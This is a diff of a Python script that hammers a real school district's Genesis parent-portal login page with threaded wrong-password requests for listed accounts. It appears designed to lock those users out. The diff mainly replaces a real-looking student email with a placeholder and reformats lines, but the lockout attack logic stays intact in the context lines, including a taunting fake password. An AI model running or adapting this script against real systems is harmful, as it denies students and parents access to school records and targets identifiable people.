@@ -8,7 +8,7 @@ import os
 import re
 
 ########### CONFIG ###########
-accounts   = ['connorslade@bernardsboe.com']
+accounts   = ['fakeUser@bernardsboe.com']
 url        = 'https://parents.genesisedu.com/bernardsboe/sis/j_security_check'
 checkUrl   = 'https://parents.genesisedu.com/bernardsboe/sis/view?gohome=true'
 timeout    = 0.5
@@ -27,16 +27,13 @@ ColorCodes = {'black': '30', 'red': '31', 'yellow': '33', 'green': '32', 'blue':
 
 
 def colored(text, color):
-    if not COLOR:
-        return text
+    if not COLOR: return text
     return '\033[' + ColorCodes[str(color).lower()] + 'm' + str(text) + "\033[0m"
 
 
 def DebugPrint(Category, Text, Color):
-    if not DEBUG:
-        return
-    print(colored('['+datetime.now().strftime("%H:%M:%S")+'] ', 'yellow') +
-          colored('['+Category+'] ', 'magenta')+colored(Text, Color))
+    if not DEBUG: return
+    print(f"{colored('['+datetime.now().strftime('%H:%M:%S')+']', 'yellow')} {colored('['+Category+'] ', 'magenta')} {colored(Text, Color)}")
 
 
 class lock(threading.Thread):
@@ -57,8 +54,7 @@ class lock(threading.Thread):
                 ses.get(self.checkUrl)
                 dataToSend = {"j_password": "You are being hacked :P (not really)", "j_username": self.user}
                 ses.post(self.url, timeout=self.timeout, data=dataToSend)
-            except:
-                DebugPrint("Lock", f'{colored("Error", "red")} {colored(f"T{str(self.thread).ljust(2)}", "blue")}', "cyan")
+            except: DebugPrint("Lock", f'{colored("Error", "red")} {colored(f"T{str(self.thread).ljust(2)}", "blue")}', "cyan")
         complete += 1
 
 ####### MAIN FUNCTION #######
@@ -80,6 +76,6 @@ if __name__ == "__main__":
     try: main()
     except: DebugPrint('Main', 'Exiting...', 'red')
     while True:
-        if complete >= len(accounts):
-            DebugPrint('Main', f'Complete {colored(f"[{int(time.time()-startTime)}]", "cyan")}', 'green')
-            break
+        if complete < len(accounts): continue
+        DebugPrint('Main', f'Complete {colored(f"[{int(time.time()-startTime)}]", "cyan")}', 'green')
+        break
